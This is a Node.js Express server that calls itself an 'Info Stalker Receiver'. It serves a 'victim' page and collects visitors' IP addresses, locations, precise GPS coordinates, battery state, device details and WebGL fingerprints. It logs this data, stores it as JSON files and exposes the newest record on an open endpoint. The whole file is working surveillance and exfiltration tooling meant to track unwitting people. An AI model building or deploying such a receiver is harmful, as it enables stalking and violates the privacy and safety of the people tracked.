const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(express.json({ limit: '10mb' }));

// Serve the victim HTML file at the root
app.use(express.static(__dirname + '/'));

// === ENDPOINT 1: CAPTURE DATA ===
app.post('/api/capture', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');

    // 1. Pretty Print to Console (Visible in Render Logs)
    console.log('\n' + '🕵️  NEW VISITOR DETECTED');
    console.log('='.repeat(50));
    console.log(`⏰ Time: ${timestamp}`);
    console.log(`📍 IP: ${data.ip?.ip || 'N/A'}`);
    console.log(`🏙️  City: ${data.ip?.city || 'N/A'}, Region: ${data.ip?.region || 'N/A'}`);
    console.log(`🌍 Country: ${data.ip?.country_name || 'N/A'}`);
    console.log(`📡 GPS: ${data.gps?.latitude || 'N/A'}, ${data.gps?.longitude || 'N/A'} (Accuracy: ±${data.gps?.accuracy || 'N/A'}m)`);
    console.log(`📱 UserAgent: ${data.device?.userAgent || 'N/A'}`);
    console.log(`🔋 Battery: ${data.battery?.level || 'N/A'}% (Charging: ${data.battery?.charging || 'N/A'})`);
    console.log(`🖥️  Screen: ${data.device?.screen?.width || 'N/A'}x${data.device?.screen?.height || 'N/A'}`);
    console.log(`🔊 WebGL Vendor: ${data.storage?.webGL?.vendor || 'N/A'}`);
    console.log('='.repeat(50) + '\n');

    // 2. Save to local file (Optional: Render has ephemeral storage, but good for debugging)
    const DATA_DIR = path.join(__dirname, 'data');
    if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
    }
    
    const filename = path.join(DATA_DIR, `visitor_${timestamp}.json`);
    try {
        fs.writeFileSync(filename, JSON.stringify(data, null, 2));
        console.log(`💾 Saved to: ${filename}`);
    } catch (err) {
        console.error('Failed to save file:', err);
    }

    // 3. Return success
    res.status(200).json({ 
        status: 'success', 
        message: 'Data received',
        id: timestamp 
    });
});

// === ENDPOINT 2: VIEW LATEST DATA (Simple JSON Dashboard) ===
app.get('/api/latest', (req, res) => {
    const DATA_DIR = path.join(__dirname, 'data');
    if (!fs.existsSync(DATA_DIR)) {
        return res.json({ message: 'No data directory yet.', data: null });
    }

    const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith('.json')).sort().reverse();
    if (files.length === 0) {
        return res.json({ message: 'No visitors yet.', data: null });
    }
    
    const latestFile = path.join(DATA_DIR, files[0]);
    try {
        const data = JSON.parse(fs.readFileSync(latestFile, 'utf8'));
        res.json({ 
            message: 'Latest Visitor Data', 
            file: files[0],
            data: data 
        });
    } catch (err) {
        res.status(500).json({ error: 'Failed to read data' });
    }
});

// === START SERVER ===
app.listen(PORT, () => {
    console.log(`🚀 Info Stalker Receiver running on port ${PORT}`);
    console.log(`📥 POST endpoint: /api/capture`);
    console.log(`📊 GET latest data: /api/latest`);
    console.log(`🌐 Victim page: / (root)`);
});
